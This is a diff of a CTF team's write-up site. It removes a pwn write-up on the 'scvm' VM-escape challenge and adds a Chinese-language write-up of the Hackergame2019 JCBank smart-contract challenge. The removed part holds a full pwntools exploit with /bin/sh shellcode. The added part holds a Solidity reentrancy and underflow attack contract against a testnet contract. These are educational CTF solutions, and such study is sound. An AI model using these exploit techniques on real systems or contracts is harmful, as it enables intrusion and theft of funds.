@@ -13,7 +13,7 @@
         <meta name="description" content="writeups of f61d team">
       
       
-        <link rel="canonical" href="https://f61d.github.io/pwn/VMEscape/scvm/">
+        <link rel="canonical" href="https://f61d.github.io/misc/blockchain/Hackergame2019_JCBank/">
       
       
         <meta name="author" content="f61d">
@@ -42,7 +42,7 @@
     
     
       
-        <title>scvm - f61d</title>
+        <title>Hackergame2019_JCBank - f61d</title>
       
     
     
@@ -91,7 +91,7 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
     
-      <a href="#scvm" tabindex="1" class="md-skip">
+      <a href="#hackergame2019-jcbank" tabindex="1" class="md-skip">
         Skip to content
       </a>
     
@@ -117,7 +117,7 @@
             </span>
             <span class="md-header-nav__topic">
               
-                scvm
+                Hackergame2019_JCBank
               
             </span>
           
@@ -219,7 +219,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../" class="md-tabs__link md-tabs__link--active">
+        <a href="../../../pwn/" class="md-tabs__link">
           pwn
         </a>
       
@@ -258,7 +258,7 @@
   
     <li class="md-tabs__item">
       
-        <a href="../../../misc/" class="md-tabs__link">
+        <a href="../../" class="md-tabs__link md-tabs__link--active">
           misc
         </a>
       
@@ -482,12 +482,10 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3" checked>
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
     
     <label class="md-nav__link" for="nav-3">
       pwn
@@ -505,7 +503,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../" title="home" class="md-nav__link">
+    <a href="../../../pwn/" title="home" class="md-nav__link">
       home
     </a>
   </li>
@@ -536,7 +534,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../Heap/LazyHouse/" title="LazyHouse" class="md-nav__link">
+    <a href="../../../pwn/Heap/LazyHouse/" title="LazyHouse" class="md-nav__link">
       LazyHouse
     </a>
   </li>
@@ -548,7 +546,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../Heap/4-ReeHY-main/" title="4-ReeHY-main" class="md-nav__link">
+    <a href="../../../pwn/Heap/4-ReeHY-main/" title="4-ReeHY-main" class="md-nav__link">
       4-ReeHY-main
     </a>
   </li>
@@ -563,12 +561,10 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3" checked>
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
     
     <label class="md-nav__link" for="nav-3-3">
       VMEscape
@@ -586,7 +582,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../BabyQemu/" title="BabyQemu" class="md-nav__link">
+    <a href="../../../pwn/VMEscape/BabyQemu/" title="BabyQemu" class="md-nav__link">
       BabyQemu
     </a>
   </li>
@@ -596,137 +592,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        scvm
-      </label>
-    
-    <a href="./" title="scvm" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../../../pwn/VMEscape/scvm/" title="scvm" class="md-nav__link">
       scvm
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">Table of contents</label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#reverse" class="md-nav__link">
-    Reverse
-  </a>
-  
-    <nav class="md-nav">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#vm-struct" class="md-nav__link">
-    VM Struct
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#instruction-type" class="md-nav__link">
-    Instruction Type
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#functions" class="md-nav__link">
-    Functions
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#vulnerability" class="md-nav__link">
-    Vulnerability
-  </a>
-  
-    <nav class="md-nav">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#incomplete-checking" class="md-nav__link">
-    Incomplete Checking
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#self-modifying-code" class="md-nav__link">
-    self-modifying code
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
-  </a>
-  
-    <nav class="md-nav">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#leak" class="md-nav__link">
-    Leak
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#shellcode" class="md-nav__link">
-    Shellcode
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exp" class="md-nav__link">
-    EXP
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-      
-      
-      
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -852,10 +722,12 @@
       
       
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6" checked>
     
     <label class="md-nav__link" for="nav-6">
       misc
@@ -873,7 +745,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../misc/" title="home" class="md-nav__link">
+    <a href="../../" title="home" class="md-nav__link">
       home
     </a>
   </li>
@@ -883,10 +755,12 @@
           
           
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6-2" type="checkbox" id="nav-6-2" checked>
     
     <label class="md-nav__link" for="nav-6-2">
       blockchain
@@ -904,7 +778,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../misc/blockchain/RoarCTF2019_CoinFlip/" title="RoarCTF2019_CoinFlip" class="md-nav__link">
+    <a href="../RoarCTF2019_CoinFlip/" title="RoarCTF2019_CoinFlip" class="md-nav__link">
       RoarCTF2019_CoinFlip
     </a>
   </li>
@@ -914,11 +788,58 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../../../misc/blockchain/Hackergame2019_JCBank/" title="Hackergame2019_JCBank" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Hackergame2019_JCBank
+      </label>
+    
+    <a href="./" title="Hackergame2019_JCBank" class="md-nav__link md-nav__link--active">
       Hackergame2019_JCBank
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hackergame2019-jcbank" class="md-nav__link">
+    Hackergame2019 JCBank
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#analysis" class="md-nav__link">
+    Analysis
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -952,7 +873,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../../misc/forensic/Traffic_Analysis/" title="Traffic_Analysis" class="md-nav__link">
+    <a href="../../forensic/Traffic_Analysis/" title="Traffic_Analysis" class="md-nav__link">
       Traffic_Analysis
     </a>
   </li>
@@ -1018,98 +939,21 @@
 <nav class="md-nav md-nav--secondary">
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">Table of contents</label>
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#reverse" class="md-nav__link">
-    Reverse
+  <a href="#hackergame2019-jcbank" class="md-nav__link">
+    Hackergame2019 JCBank
   </a>
   
     <nav class="md-nav">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#vm-struct" class="md-nav__link">
-    VM Struct
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#instruction-type" class="md-nav__link">
-    Instruction Type
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#functions" class="md-nav__link">
-    Functions
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#vulnerability" class="md-nav__link">
-    Vulnerability
-  </a>
-  
-    <nav class="md-nav">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#incomplete-checking" class="md-nav__link">
-    Incomplete Checking
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#self-modifying-code" class="md-nav__link">
-    self-modifying code
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
-  </a>
-  
-    <nav class="md-nav">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#leak" class="md-nav__link">
-    Leak
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#shellcode" class="md-nav__link">
-    Shellcode
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#exp" class="md-nav__link">
-    EXP
+  <a href="#analysis" class="md-nav__link">
+    Analysis
   </a>
   
 </li>
@@ -1135,178 +979,84 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/f61d/f61d.github.io/blob/dev/docs/pwn/VMEscape/scvm.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
+                  <a href="https://github.com/f61d/f61d.github.io/blob/dev/docs/misc/blockchain/Hackergame2019_JCBank.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                <h1 id="scvm">scvm<a class="headerlink" href="#scvm" title="Permanent link">&para;</a></h1>
-<blockquote>
-<p>huwangbei2019 offline
-An easy VM challenge. Compared with the system-level virtual machine topic, this kind of topic can be understood as customizing a CPU instruction set, and realizing the emulator of the instruction set, not the virtualization at the hardware system level.</p>
-</blockquote>
-<h2 id="reverse">Reverse<a class="headerlink" href="#reverse" title="Permanent link">&para;</a></h2>
-<h3 id="vm-struct">VM Struct<a class="headerlink" href="#vm-struct" title="Permanent link">&para;</a></h3>
-<p>It is really easy to know the struct of VM by analyzing the function as follows.</p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/VMEscape/scvm/index_files/c09dcfb1-07c7-4ee7-a2bb-260d11d3530b.png" /></p>
-<div class="codehilite"><pre><span></span>00000000 vm_t            struc ; (sizeof=0x20, mappedto_8)
-00000000 reg_cnt         dd ?
-00000004 fun_cnt         dd ?
-00000008 regs            dq ?
-00000010 funs            dq ?                    ; base 2
-00000018 mem             dq ?
-00000020 vm_t            ends
-00000020
+                  <h1>Hackergame2019_JCBank</h1>
+                
+                <h2 id="hackergame2019-jcbank">Hackergame2019 JCBank<a class="headerlink" href="#hackergame2019-jcbank" title="Permanent link">&para;</a></h2>
+<ul>
+<li>以太坊 <code>Kovan</code> 测试链</li>
+<li>合约地址：<a href="https://kovan.etherscan.io/address/0xE575c9abD35Fa94F1949f7d559056bB66FddEB51">https://kovan.etherscan.io/address/0xE575c9abD35Fa94F1949f7d559056bB66FddEB51</a></li>
+<li>题目：<a href="https://github.com/f61d/challenges/tree/master/misc/blockchain/Hackergame2019_JCBank/attachment">https://github.com/f61d/challenges/tree/master/misc/blockchain/Hackergame2019_JCBank/attachment</a></li>
+</ul>
+<h3 id="analysis">Analysis<a class="headerlink" href="#analysis" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>两个 <code>flag</code> :</p>
+<ul>
+<li><code>get_flag_1</code></li>
+<li><code>get_flag_2</code></li>
+</ul>
+</li>
+<li>
+<p><code>get_flag_1</code> 读取 <code>storage</code> 变量 <code>secret</code> 的值即可，其位于 <code>slot 0</code> 的位置，其值为 <code>0x175bddc0da1bd47369c47861f48c8ac</code> ，调用 <code>get_flag_1</code> 即可</p>
+</li>
+</ul>
+<div class="codehilite"><pre><span></span><span class="kd">var</span> <span class="nx">Web3</span><span class="o">=</span><span class="nx">require</span><span class="p">(</span><span class="s2">&quot;web3&quot;</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">web3</span> <span class="o">!==</span> <span class="s1">&#39;undefined&#39;</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">web3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Web3</span><span class="p">(</span><span class="nx">web3</span><span class="p">.</span><span class="nx">currentProvider</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nx">web3</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Web3</span><span class="p">(</span><span class="k">new</span> <span class="nx">Web3</span><span class="p">.</span><span class="nx">providers</span><span class="p">.</span><span class="nx">HttpProvider</span><span class="p">(</span><span class="s2">&quot;https://kovan.infura.io/v3/b38f10b5036f4e6691fcc690461097d1&quot;</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">address</span><span class="o">=</span><span class="s2">&quot;0xE575c9abD35Fa94F1949f7d559056bB66FddEB51&quot;</span><span class="p">;</span>
+<span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">y</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="nx">y</span><span class="p">)});</span>
+<span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">y</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="nx">y</span><span class="p">)});</span>
+<span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">address</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">y</span><span class="p">){</span><span class="nx">console</span><span class="p">.</span><span class="nx">info</span><span class="p">(</span><span class="nx">y</span><span class="p">)});</span>
 </pre></div>
 
-<h3 id="instruction-type">Instruction Type<a class="headerlink" href="#instruction-type" title="Permanent link">&para;</a></h3>
-<p>Instructions are four byte long and byte-aligned.
-<div class="codehilite"><pre><span></span>[fun_id] [val1] [val2] [val3]
+<ul>
+<li><code>get_flag_2</code> 利用 <span id="inline-blue">Reentrancy</span> 和 <span id="inline-yellow">整型下溢</span></li>
+</ul>
+<div class="codehilite"><pre><span></span><span class="nx">contract</span> <span class="nx">hack</span> <span class="p">{</span>
+    <span class="nx">address</span> <span class="nx">instance_address</span> <span class="o">=</span> <span class="mh">0xE575c9abD35Fa94F1949f7d559056bB66FddEB51</span><span class="p">;</span>
+    <span class="nx">JCBank</span> <span class="nx">target</span> <span class="o">=</span> <span class="nx">JCBank</span><span class="p">(</span><span class="nx">instance_address</span><span class="p">);</span>
+    <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">have_withdraw</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="nx">string</span> <span class="kr">public</span> <span class="nx">s</span><span class="p">;</span>
+
+    <span class="nx">constructor</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">payable</span> <span class="p">{}</span>
+
+    <span class="kd">function</span> <span class="nx">attack</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">target</span><span class="p">.</span><span class="nx">deposit</span><span class="p">.</span><span class="nx">value</span><span class="p">(</span><span class="mf">0.1</span> <span class="nx">ether</span><span class="p">)();</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">attack1</span><span class="p">(</span><span class="nx">uint128</span> <span class="nx">guess</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">s</span><span class="o">=</span><span class="nx">target</span><span class="p">.</span><span class="nx">get_flag_1</span><span class="p">(</span><span class="nx">guess</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">attack2</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">have_withdraw</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
+            <span class="nx">target</span><span class="p">.</span><span class="nx">get_flag_2</span><span class="p">(</span><span class="mi">155418233698</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span> <span class="nx">attack3</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="nx">target</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="mf">0.1</span> <span class="nx">ether</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kd">function</span><span class="p">()</span> <span class="nx">payable</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">have_withdraw</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span> <span class="o">==</span> <span class="nx">instance_address</span><span class="p">){</span>
+            <span class="nx">have_withdraw</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="nx">target</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="mf">0.1</span> <span class="nx">ether</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 </pre></div>
-<code>fun_id</code> is used to know which function should be called.</p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/VMEscape/scvm/index_files/25a2abec-51fd-4f14-a4ea-8383954a99f7.png" /></p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/VMEscape/scvm/index_files/a6b6ef5e-0dc4-4004-9779-ea45af95f053.png" /></p>
-<p>For example, instruction <strong>add</strong> use 3 vals and do the operation <code>regs[val1] = regs[val2] + regs[val3]</code>.</p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/VMEscape/scvm/index_files/0e8ca81c-af65-45e0-b5d9-3fa11d80db64.png" /></p>
-<h3 id="functions">Functions<a class="headerlink" href="#functions" title="Permanent link">&para;</a></h3>
-<p>10 functions are supported, but function <strong>lea</strong> is not useful.
-<div class="codehilite"><pre><span></span>exit: exit(0)
-add: regs[val1] = regs[val2] + regs[val3]
-sub: regs[val1] = regs[val2] - regs[val3]
-mul: regs[val1] = regs[val2] * regs[val3]
-div: regs[val1] = regs[val2] / regs[val3]
-mod: regs[val1] = regs[val2] % regs[val3]
-mov: regs[val1] = val2
-print: print(reg[val3])
-lea: regs[val1] = (uint32_t)(vm-&gt;mem + val2)
-mov2mem: *(byte *)(vm-&gt;mem + val2) = regs[val1]
-</pre></div></p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/VMEscape/scvm/index_files/e406537c-93e3-43f5-8f20-778b89c58aa6.png" /></p>
-<h2 id="vulnerability">Vulnerability<a class="headerlink" href="#vulnerability" title="Permanent link">&para;</a></h2>
-<h3 id="incomplete-checking">Incomplete Checking<a class="headerlink" href="#incomplete-checking" title="Permanent link">&para;</a></h3>
-<p>We can input <strong>0x1000</strong> bytes as <strong>vm-&gt;mem</strong>. However, the check will only check 0x800 bytes, so we can bypass this check if we input malicious instructions after 0x800 bytes.</p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/VMEscape/scvm/index_files/52293c95-f348-4cbf-a676-33b2488c01f1.png" /></p>
-<h3 id="self-modifying-code">self-modifying code<a class="headerlink" href="#self-modifying-code" title="Permanent link">&para;</a></h3>
-<p>It is obvious that instruction <code>mov2mem</code> can modify <code>*(byte *)(vm-&gt;mem + val2)</code> to the value of <code>regs[val1]</code>. But it does not check the value of val2.
-So, we can modify the value of a bytes in memory (0 ~ 0xff) to the value we want, static check makes no sense.</p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/VMEscape/scvm/index_files/41c0ff76-e9a2-472f-829b-b7064c510bca.png" /></p>
-<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
-<p>It is enough to use <strong>Incomplete Checking</strong> for exploiting. Firstly, we input enough bytes (more than <strong>0x800</strong>) to bypass static checking.</p>
-<div class="codehilite"><pre><span></span>payload = gen_sub(0x0, 0x0, 0x0) * (0x800 / 4)
-</pre></div>
 
-<h3 id="leak">Leak<a class="headerlink" href="#leak" title="Permanent link">&para;</a></h3>
-<p>We cannot leak address of <code>vm-&gt;mem</code> by original <strong>print</strong> like operations, because we can only input once. So, we need to leak <code>vm-&gt;mem</code> to a reg of this vm and use the instructions integrated into this vm (<code>sub</code> or <code>add</code> is great).</p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/VMEscape/scvm/index_files/c1f81533-e65a-4c70-9be3-74b9cf19bb40.png" /></p>
-<p>We the vm is inited, heap chunk for <strong>regs</strong> and <strong>funcs</strong> are allocated and then the struct <strong>vm</strong> is allocated, too. We can use <strong>sub</strong> to get the value of <code>regs[0~0xff]</code>. So, leak is done.
-We can also use this trick to modify the value of <code>funs[i]</code> to the one we like.
-However, remember that the operand size is <strong>32 bits</strong>, not 64 bits. The arch of this executable elf is <strong>amd64</strong>. So, we need to modify the value of a function ptr twice (low 32 bits and high 32 bits).</p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/VMEscape/scvm/index_files/0a810f30-4086-4f80-9d02-06c30f63a002.png" /></p>
-<h3 id="shellcode">Shellcode<a class="headerlink" href="#shellcode" title="Permanent link">&para;</a></h3>
-<p>It is easy that the memory allocated for vm is marked as <strong>rwx</strong>, so we just need to set <code>rip</code> to the address of our vm mem.</p>
-<p><img alt="" src="https://raw.githubusercontent.com/f61d/challenges/master/pwn/VMEscape/scvm/index_files/3f9ecd99-4ca4-4a1b-960a-619406318e09.png" /></p>
-<h3 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span>from pwn import *
-
-local=1
-pc=&#39;./scvm&#39;
-aslr=True
-context.log_level=True
-context.arch = &quot;amd64&quot;
-context.word_size = 64
-context.os = &quot;linux&quot;
-context.endian = &quot;little&quot;
-
-if local==1:
-    #p = process(pc,aslr=aslr,env={&#39;LD_PRELOAD&#39;: &#39;./libc.so.6&#39;})
-    p = process(pc,aslr=aslr)
-    gdb.attach(p)
-else:
-    remote_addr=[&#39;172.16.9.45&#39;, 17730]
-    p=remote(remote_addr[0],remote_addr[1])
-
-ru = lambda x : p.recvuntil(x)
-sn = lambda x : p.send(x)
-rl = lambda   : p.recvline()
-sl = lambda x : p.sendline(x)
-rv = lambda x : p.recv(x)
-sa = lambda a,b : p.sendafter(a,b)
-sla = lambda a,b : p.sendlineafter(a,b)
-
-def lg(s,addr):
-    print(&#39;\033[1;31;40m%20s--&gt;0x%x\033[0m&#39;%(s,addr))
-
-def gen_print(i, j=0, k=0):
-    s = &quot;&quot;
-    s += chr(7)
-    s += chr(i)
-    s += chr(j)
-    s += chr(k)
-    return s
-
-def gen_mov(i, j, k = 0):
-    s = &quot;&quot;
-    s += chr(6)
-    s += chr(i)
-    s += chr(j)
-    s += chr(k)
-    return s
-
-def gen_sub(i, j, k):
-    s = &quot;&quot;
-    s += chr(2)
-    s += chr(i)
-    s += chr(j)
-    s += chr(k)
-    return s
-
-def gen_add(i, j, k):
-    s = &quot;&quot;
-    s += chr(1)
-    s += chr(i)
-    s += chr(j)
-    s += chr(k)
-    return s
-
-
-
-def raddr(a=6):
-    if(a==6):
-        return u64(rv(a).ljust(8,&#39;\x00&#39;))
-    else:
-        return u64(rl().strip(&#39;\n&#39;).ljust(8,&#39;\x00&#39;))
-
-if __name__ == &#39;__main__&#39;:
-    payload = gen_sub(0x0, 0x0, 0x0) * (0x800 / 4)
-
-    payload+= gen_mov(0,0x80)
-    payload+= gen_sub(2, 0x2e + 4, 2)
-    payload+= gen_sub(3, 0x2f + 4, 3)
-
-    for i in range(0, 0x12):
-        payload+= gen_add(2, 0, 2)
-
-    payload+= gen_sub(0x22, 0x22, 0x22)
-    payload+= gen_sub(0x23, 0x23, 0x23)
-
-    payload+= gen_sub(0x22, 0x2, 0x22)
-    payload+= gen_sub(0x23, 0x3, 0x23)
-
-    payload+= gen_print(0x10)
-
-    payload = payload.ljust(0x900, &quot;\x00&quot;)
-
-    buf =  &quot;&quot;
-    buf += &quot;\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73&quot;
-    buf += &quot;\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89&quot;
-    buf += &quot;\xe6\xb0\x3b\x0f\x05&quot;
-
-    payload+= buf
-
-    #payload = payload.ljust(0xa0, &quot;\x00&quot;)
-    #payload+= p32( 0x11DA - 0x10A0)
-
-    sn(payload)
-    p.interactive()
-</pre></div>
+<ul>
+<li><code>attack</code> 存入一点金额，<code>attack3</code> 重入攻击两次， <code>attack2</code> 调用 <code>get_flag_2</code> 即可</li>
+</ul>
                 
                   
                 
@@ -1327,7 +1077,7 @@ if __name__ == &#39;__main__&#39;:
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../BabyQemu/" title="BabyQemu" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../RoarCTF2019_CoinFlip/" title="RoarCTF2019_CoinFlip" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -1336,19 +1086,19 @@ if __name__ == &#39;__main__&#39;:
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                BabyQemu
+                RoarCTF2019_CoinFlip
               </span>
             </div>
           </a>
         
         
-          <a href="../../../crypto/" title="home" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../../forensic/Traffic_Analysis/" title="Traffic_Analysis" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                home
+                Traffic_Analysis
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
